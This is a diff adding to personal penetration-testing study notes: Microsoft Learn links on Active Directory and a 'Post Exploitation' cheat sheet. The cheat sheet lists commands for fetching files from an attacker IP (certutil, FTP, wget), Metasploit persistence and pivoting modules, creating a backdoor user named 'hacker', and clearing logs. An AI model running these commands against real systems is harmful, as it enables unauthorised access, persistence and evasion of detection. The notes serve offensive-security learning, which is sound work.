@@ -216,6 +216,7 @@ kali    - nc -nv 192.168.1.100 9999
 
 
 #Active Directory Overview
+https://learn.microsoft.com/en-us/training/modules/introduction-to-ad-ds/3-define-users-groups-computers
 manage windows domain networks
 stores info of objs - commp, users, printers...
 Kerberos authentication
@@ -273,6 +274,7 @@ Objects - User - enables net recs access for user
 
 
 #AD lab
+https://learn.microsoft.com/en-us/training/modules/introduction-to-ad-ds/3-define-users-groups-computers
 
 
 
@@ -283,6 +285,56 @@ Objects - User - enables net recs access for user
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#Post Exploitation
+File transfers
+       certutil.exe --urlcache if http://IP/file.txt file.txt
+       python -m http.server 9090
+       python -m SimpleHTTPServer 9090
+       Direct browser navigation
+       FTP - python -m pyftpdlib 21 <attackerIP>
+           - ftp <attackerIP>
+       wget
+       metasploit
+Maintaining access
+       persistence scripts
+              run persistence -h
+              exploit/windows/local/persistence
+              exploit/windows/local/registry_persistence
+       scheduled tasks
+              run scheduleme
+              run schtaskabuse
+       add user
+              net user hacker password123 /add
+              sudo useradd hacker(sudo useradd -m username -  - with home dir
+                                  sudo useradd -m -d /opt/username username - with specific home dir)
+              sudo passwd hacker
+Pivoting(ssh, proxychains, msf)
+       exploit/windows/smb/psexec
+       route
+       ipconfig
+       arp -a
+       run autoroute -s 10.10.10.0/24
+       run autoroute -p
+       bg
+       use auxiliary/scanner/portscan/tcp
+Cleanup - remove executables, scripts, added files
+        - rm malware, rootkits, added users
+        - revoke settings to original
+        - clear logs
 
 
 
